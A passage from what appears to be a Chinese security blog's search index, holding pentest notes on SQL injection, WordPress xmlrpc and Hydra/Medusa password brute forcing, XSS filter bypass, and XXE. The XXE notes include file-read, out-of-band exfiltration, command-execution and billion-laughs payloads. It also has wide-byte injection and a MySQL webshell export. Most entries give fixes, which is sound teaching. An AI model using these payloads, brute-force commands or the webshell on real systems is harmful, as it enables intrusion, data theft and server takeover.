感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"利用xmlrpc-php爆破wordpress","slug":"利用xmlrpc-php爆破wordpress","date":"2020-01-14T03:33:03.000Z","updated":"2020-01-14T03:35:03.896Z","comments":true,"path":"2020/01/14/利用xmlrpc-php爆破wordpress/","link":"","permalink":"http://yoursite.com/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/","excerpt":"最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。 攻击方法攻击的方式为使用POST提交以下数据到xmlrpc.php： &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt; &lt;methodCall&gt; &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; &lt;params&gt; &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt; &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt; &lt;/params&gt; &lt;/methodCall&gt;用户名或密码不正确，返回结果如下：用户名和密码正确，则返回结果如下： 修复方法修复方法有以下几种：1.安装Login Security Solution插件。2.删除xmlrpc.php文件。3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。 案例演示靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：","text":"最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。 攻击方法攻击的方式为使用POST提交以下数据到xmlrpc.php： &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt; &lt;methodCall&gt; &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt; &lt;params&gt; &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt; &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt; &lt;/params&gt; &lt;/methodCall&gt;用户名或密码不正确，返回结果如下：用户名和密码正确，则返回结果如下： 修复方法修复方法有以下几种：1.安装Login Security Solution插件。2.删除xmlrpc.php文件。3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。 案例演示靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：","categories":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}],"tags":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]},{"title":"密码爆破神器Medusa","slug":"密码爆破神器Medusa","date":"2020-01-14T03:24:39.000Z","updated":"2020-01-14T03:27:23.126Z","comments":true,"path":"2020/01/14/密码爆破神器Medusa/","link":"","permalink":"http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/","excerpt":"Medusa，美杜莎，希腊神话中的蛇发女妖： （挺奇怪为什么密码爆破神器都以希腊神话中的怪物命名） 与Hydra一样，Medusa支持多种协议的密码爆破，是当之无愧的密码爆破神器。 Medusa选项Medusa的选项和参数如下： -h [TEXT] 目标主机名或IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件，格式为：host:user:password-O [FILE] 日志信息文件-e [n/s/ns] n代表空密码，s代表用户名与密码相同-M [TEXT] 执行模块名称-m [TEXT] 传递参数到模块，可以传输多个参数-d 显示所有模块名称-n [NUM] 指定非默认端口-s 启用SSL-g [NUM] 尝试连接超时时间（默认为3秒）-r [NUM] 重试间隔时间（默认为3秒）-R [NUM] 超时之前的尝试次数（N），总尝试次数为N+1-C [NUM] socket连接等待时间（默认为500微秒）-t [NUM] 同时测试的登录数线程-T [NUM] 同时测试的主机数线程-L 每个用户使用一个线程-f 匹配第一个结果时停止破解-q 显示模块的使用信息-v [NUM] 详细信息显示级别[0-6]-w [NUM] 错误高度信息显示级别[0-6]-V 显示版本-Z [TEXT] 继续上一次扫描 Medusa举例Medusa支持的协议（称之为模块）如下：爆破ssh密码： medusa -u root -P pass_top100.txt -e ns -h 192.168.216.130 -M ssh 可以使用-q查阅模块的使用信息，比如查阅web-form模块：","text":"Medusa，美杜莎，希腊神话中的蛇发女妖： （挺奇怪为什么密码爆破神器都以希腊神话中的怪物命名） 与Hydra一样，Medusa支持多种协议的密码爆破，是当之无愧的密码爆破神器。 Medusa选项Medusa的选项和参数如下： -h [TEXT] 目标主机名或IP-H [FILE] 目标主机文件-u [TEXT] 用户名-U [FILE] 用户名文件-p [TEXT] 密码-P [FILE] 密码文件-C [FILE] 组合条目文件，格式为：host:user:password-O [FILE] 日志信息文件-e [n/s/ns] n代表空密码，s代表用户名与密码相同-M [TEXT] 执行模块名称-m [TEXT] 传递参数到模块，可以传输多个参数-d 显示所有模块名称-n [NUM] 指定非默认端口-s 启用SSL-g [NUM] 尝试连接超时时间（默认为3秒）-r [NUM] 重试间隔时间（默认为3秒）-R [NUM] 超时之前的尝试次数（N），总尝试次数为N+1-C [NUM] socket连接等待时间（默认为500微秒）-t [NUM] 同时测试的登录数线程-T [NUM] 同时测试的主机数线程-L 每个用户使用一个线程-f 匹配第一个结果时停止破解-q 显示模块的使用信息-v [NUM] 详细信息显示级别[0-6]-w [NUM] 错误高度信息显示级别[0-6]-V 显示版本-Z [TEXT] 继续上一次扫描 Medusa举例Medusa支持的协议（称之为模块）如下：爆破ssh密码： medusa -u root -P pass_top100.txt -e ns -h 192.168.216.130 -M ssh 可以使用-q查阅模块的使用信息，比如查阅web-form模块： medusa -M web-form –q 爆破http： medusa -u admin -P pass.txt -h 192.168.216.1 -f -M web-form -m FORM:”dvwa/vulnerabilities/brute/“ -m FORM-DATA:”get?username=&amp;password=&amp;Login=Login” -m DENY-SIGNAL:”incorrect” -m CUSTOM-HEADER:”Cookie: security=low;PHPSESSID=js5pe87plji0pug7oab1278ho4” -m USER-AGENT:”Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0”","categories":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}],"tags":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]},{"title":"密码爆破神器Hydra","slug":"密码爆破神器Hydra","date":"2020-01-14T03:16:42.000Z","updated":"2020-01-14T03:24:02.496Z","comments":true,"path":"2020/01/14/密码爆破神器Hydra/","link":"","permalink":"http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/","excerpt":"Hydra，希腊神话中的怪兽许德拉，就是九头蛇，长这样：好吧，扯远了，我们要说的是Kali中的密码爆破神器Hydra。Hydra支持多种协议的破解，Github上的地址是：https://github.com/vanhauser-thc/thc-hydraHydra也有Windows版本，Github上的地址是：https://github.com/maaaaz/thc-hydra-windowsHydra目前支持的协议如下： Hydra选项Hydra的选项如下：翻译一下： -R 继续从上一次中断的进度进行破解 -I 忽略已存在的存储文件（不需要等待10秒） -S 采用SSL连接 -s PORT 指定非默认端口 -l LOGIN or –L FILE -l后接用户名，-L后接用户字典文件 -p PASS or –P FILE -p后接密码，-P后接密码字典文件 -x MIN:MAX:CHARSET 密码生成器，输入“-x -h”来获取帮助信息 -y 禁止在暴力破解中使用符号 -e nsr n表示空密码，s表示用户名和密码相同，r表示用户名和密码翻转 -u 围绕用户名进行探测 -C FILE 字典格式为login:pass，取代-L/-P选项 -M FILE 同时攻击多个服务，每行一个服务名，冒号后接端口 -o FILE 指定结果输出文件，用于替代标准屏幕输出 -b FORMAT 指定输出文件格式，有text（默认）、json、jsonv1 -f/-F 当找到第一个匹配结果时中断破解（-M: -f表示 中断单个目标的破解；-F表示中断全部目标的破解） -t TASKS 指定单个目标的线程数（默认是16） -T TASKS 指定全部目标的线程数（默认是64） -w/-W TIME 指定最大响应超时时间（默认是32）/每个线程的间隔时间（默认是0） -c TIME 指定每次登录的尝试等待时间 -4/-6 指定IPv4（默认）/IPv6 -v/-V/-d -v显示全部信息，-V显示每次登录的用户名/密码，-d显示debug信息 -O 使用SSL v2和v3 -q 不显示连接出错信息 -U 显示详细的服务模块信息 -h 显示帮助信息 server 指定目标，可以是域名、IP或者网段 service 指定服务协议（选项后面列出了支持的服务） OPT 一些支持的额外选项Hydra举例hydra –help最后有相应举例：这些都比较简直，就不详细说明了。举一个比较复杂的例子，http的爆破。使用-U可以显示模块的详细信息，查看http-post-form的信息如下： http爆破如下：图中http-post-form分成了三个段，用冒号分隔。第一段是路径；第二段是提交的参数，爆破的参数用^^包围起来；第三段是错误的关键字。 密码生成器来看一下Hydra的密码生成器功能。用法是-x MIN:MAX:CHARSET，描述如下： MIN 密码最小长度 MAX 密码最大长度 CHARSET 指定字符集，a代表小写字母，A代表大写字母，1代表数字,特殊字符需要一个个写进来 -y 禁止使用占位符使用如下：","text":"Hydra，希腊神话中的怪兽许德拉，就是九头蛇，长这样：好吧，扯远了，我们要说的是Kali中的密码爆破神器Hydra。Hydra支持多种协议的破解，Github上的地址是：https://github.com/vanhauser-thc/thc-hydraHydra也有Windows版本，Github上的地址是：https://github.com/maaaaz/thc-hydra-windowsHydra目前支持的协议如下： Hydra选项Hydra的选项如下：翻译一下： -R 继续从上一次中断的进度进行破解 -I 忽略已存在的存储文件（不需要等待10秒） -S 采用SSL连接 -s PORT 指定非默认端口 -l LOGIN or –L FILE -l后接用户名，-L后接用户字典文件 -p PASS or –P FILE -p后接密码，-P后接密码字典文件 -x MIN:MAX:CHARSET 密码生成器，输入“-x -h”来获取帮助信息 -y 禁止在暴力破解中使用符号 -e nsr n表示空密码，s表示用户名和密码相同，r表示用户名和密码翻转 -u 围绕用户名进行探测 -C FILE 字典格式为login:pass，取代-L/-P选项 -M FILE 同时攻击多个服务，每行一个服务名，冒号后接端口 -o FILE 指定结果输出文件，用于替代标准屏幕输出 -b FORMAT 指定输出文件格式，有text（默认）、json、jsonv1 -f/-F 当找到第一个匹配结果时中断破解（-M: -f表示 中断单个目标的破解；-F表示中断全部目标的破解） -t TASKS 指定单个目标的线程数（默认是16） -T TASKS 指定全部目标的线程数（默认是64） -w/-W TIME 指定最大响应超时时间（默认是32）/每个线程的间隔时间（默认是0） -c TIME 指定每次登录的尝试等待时间 -4/-6 指定IPv4（默认）/IPv6 -v/-V/-d -v显示全部信息，-V显示每次登录的用户名/密码，-d显示debug信息 -O 使用SSL v2和v3 -q 不显示连接出错信息 -U 显示详细的服务模块信息 -h 显示帮助信息 server 指定目标，可以是域名、IP或者网段 service 指定服务协议（选项后面列出了支持的服务） OPT 一些支持的额外选项Hydra举例hydra –help最后有相应举例：这些都比较简直，就不详细说明了。举一个比较复杂的例子，http的爆破。使用-U可以显示模块的详细信息，查看http-post-form的信息如下： http爆破如下：图中http-post-form分成了三个段，用冒号分隔。第一段是路径；第二段是提交的参数，爆破的参数用^^包围起来；第三段是错误的关键字。 密码生成器来看一下Hydra的密码生成器功能。用法是-x MIN:MAX:CHARSET，描述如下： MIN 密码最小长度 MAX 密码最大长度 CHARSET 指定字符集，a代表小写字母，A代表大写字母，1代表数字,特殊字符需要一个个写进来 -y 禁止使用占位符使用如下：","categories":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}],"tags":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]},{"title":"htmlspecialchars-函数过滤XSS的问题","slug":"htmlspecialchars-函数过滤XSS的问题","date":"2020-01-14T03:12:11.000Z","updated":"2020-01-14T03:15:47.010Z","comments":true,"path":"2020/01/14/htmlspecialchars-函数过滤XSS的问题/","link":"","permalink":"http://yoursite.com/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"htmlspecialchars()函数的功能如下：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。预定义的字符是： & （和号）成为 & \" （双引号）成为 \" ' （单引号）成为 ' < （小于）成为 < > （大于）成为 > 它的语法如下： htmlspecialchars(string,flags,character-set,double_encode) 其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下：可用的引号类型：ENT_COMPAT - 默认。仅编码双引号。ENT_QUOTES - 编码双引号和单引号。ENT_NOQUOTES - 不编码任何引号。默认是只编码双引号的！默认只编码双引号！默认只编码双引号……重要的事情说三遍！！！ 于是看下面的代码： &lt;?php $name = $_GET[&quot;name&quot;]; $name = htmlspecialchars($name); ?&gt; &lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; 轻松绕过：加上ENT_QUOTES参数： &lt;?php $name = $_GET[&quot;name&quot;]; $name = htmlspecialchars($name, ENT_QUOTES); ?&gt; &lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; 发现无法绕过了：","text":"htmlspecialchars()函数的功能如下：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。预定义的字符是： & （和号）成为 & \" （双引号）成为 \" ' （单引号）成为 ' < （小于）成为 < > （大于）成为 > 它的语法如下： htmlspecialchars(string,flags,character-set,double_encode) 其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下：可用的引号类型：ENT_COMPAT - 默认。仅编码双引号。ENT_QUOTES - 编码双引号和单引号。ENT_NOQUOTES - 不编码任何引号。默认是只编码双引号的！默认只编码双引号！默认只编码双引号……重要的事情说三遍！！！ 于是看下面的代码： &lt;?php $name = $_GET[&quot;name&quot;]; $name = htmlspecialchars($name); ?&gt; &lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; 轻松绕过：加上ENT_QUOTES参数： &lt;?php $name = $_GET[&quot;name&quot;]; $name = htmlspecialchars($name, ENT_QUOTES); ?&gt; &lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; 发现无法绕过了： 查看源代码：单引号已经被转换了。","categories":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/categories/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"XXE注入","slug":"XXE注入","date":"2020-01-14T03:05:43.000Z","updated":"2020-01-14T03:32:05.560Z","comments":true,"path":"2020/01/14/XXE注入/","link":"","permalink":"http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/","excerpt":"XXE注入攻击简介XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。 XXE注入利用首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。 简单检测Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE any[ &lt;!ENTITY test &quot;this is a test&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 文件读取Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt;","text":"XXE注入攻击简介XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。 XXE注入利用首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。 简单检测Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE any[ &lt;!ENTITY test &quot;this is a test&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 文件读取Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 加载外部实体Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY %file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/issue&quot;&gt; &lt;!ENTITY %dtd SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt; %dtd; %send; ]&gt; 远程服务器（192.168.1.111）的evil.dtd内容如下： &lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.1.111/?%file;&#39;&gt;&quot; &gt; %all; 触发XXE攻击后，远程服务器可以接收到文件内容，也可以通过日志查看目标服务器是否有发送http://192.168.1.111/evil.dtd的请求。 执行系统命令Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt;服务器需要有expect扩展才能执行。 探测内网端口Payload如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;http://192.168.1.1:22&quot;&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt;拒绝服务攻击 Payload如下： &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ELEMENT lolz (#PCDATA)&gt; &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;上面样例中的XXE漏洞攻击就是著名的“billion laughs”(https://en.wikipedia.org/wiki/Billion_laughs)攻击，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。 漏洞防御 XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。 漏洞演示 演示示例来自http://testhtml5.vulnweb.com/，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：用Burpsuite抓包如下： 构造测试Payload如下： 可见服务器执行了Payload，该页面易受XXE注入攻击。 参考：http://www.freebuf.com/articles/web/126788.htmlhttp://www.91ri.org/9539.html","categories":[{"name":"XXE注入","slug":"XXE注入","permalink":"http://yoursite.com/categories/XXE%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"XXE注入","slug":"XXE注入","permalink":"http://yoursite.com/tags/XXE%E6%B3%A8%E5%85%A5/"}]},{"title":"宽字节注入","slug":"宽字节注入","date":"2020-01-14T02:59:18.000Z","updated":"2020-01-14T03:02:54.036Z","comments":true,"path":"2020/01/14/宽字节注入/","link":"","permalink":"http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","excerpt":"在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下： &lt;?php header(&quot;Content-Type: text/html; charset=utf-8&quot;); $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;); mysql_select_db(&quot;test&quot;, $conn); mysql_query(&quot;SET NAMES GBK&quot;, $conn); //不安全的编码方式 $id = addslashes($_GET[&#39;id&#39;]); //不安全的转义函数 $sql = &quot;select * from test where id=&#39;$id&#39;&quot;; $query = mysql_query($sql, $conn); if($query == True) { $result = mysql_fetch_array($query); $user = $result[&quot;user&quot;]; $email = $result[&quot;email&quot;]; print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;); print_r(&#39;邮 箱： &#39; . $email . &#39;&lt;br /&gt;&#39;); $sql = mb_convert_encoding($sql, &quot;UTF-8&quot;, &quot;GBK&quot;); print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql); } mysql_close($conn); ?&gt; 单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\\（%5c）吃掉。这是因为%df和\\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下： 漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：set character_set_connection = gbk,set character_set_results=gbk,set character_set_client=gbk而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。 漏洞的防范方法有以下几种：1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。3） 使用pdo方式预编译处理数据库查询。","text":"在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下： &lt;?php header(&quot;Content-Type: text/html; charset=utf-8&quot;); $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;); mysql_select_db(&quot;test&quot;, $conn); mysql_query(&quot;SET NAMES GBK&quot;, $conn); //不安全的编码方式 $id = addslashes($_GET[&#39;id&#39;]); //不安全的转义函数 $sql = &quot;select * from test where id=&#39;$id&#39;&quot;; $query = mysql_query($sql, $conn); if($query == True) { $result = mysql_fetch_array($query); $user = $result[&quot;user&quot;]; $email = $result[&quot;email&quot;]; print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;); print_r(&#39;邮 箱： &#39; . $email . &#39;&lt;br /&gt;&#39;); $sql = mb_convert_encoding($sql, &quot;UTF-8&quot;, &quot;GBK&quot;); print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql); } mysql_close($conn); ?&gt; 单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\\（%5c）吃掉。这是因为%df和\\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下： 漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：set character_set_connection = gbk,set character_set_results=gbk,set character_set_client=gbk而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。 漏洞的防范方法有以下几种：1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。3） 使用pdo方式预编译处理数据库查询。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Mysql导出一句话","slug":"Mysql导出一句话","date":"2020-01-14T02:44:59.000Z","updated":"2020-01-14T02:49:19.231Z","comments":true,"path":"2020/01/14/Mysql导出一句话/","link":"","permalink":"http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/","excerpt":"执行语句如下： create table yjh(cmd varchar(50)); insert into yjh(cmd) values(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;); select cmd from yjh into outfile &#39;D:/www/example/cmd.php&#39;; drop table yjh; 要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：● null，表示不允许导入/导出，默认状态为null；● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；● 没有具体的值，表示不对mysql的导入/导出做出限制。 启用secure-file-priv的方法：● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =","text":"执行语句如下： create table yjh(cmd varchar(50)); insert into yjh(cmd) values(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;); select cmd from yjh into outfile &#39;D:/www/example/cmd.php&#39;; drop table yjh; 要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：● null，表示不允许导入/导出，默认状态为null；● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；● 没有具体的值，表示不对mysql的导入/导出做出限制。 启用secure-file-priv的方法：● Windows下，修改my.cnf 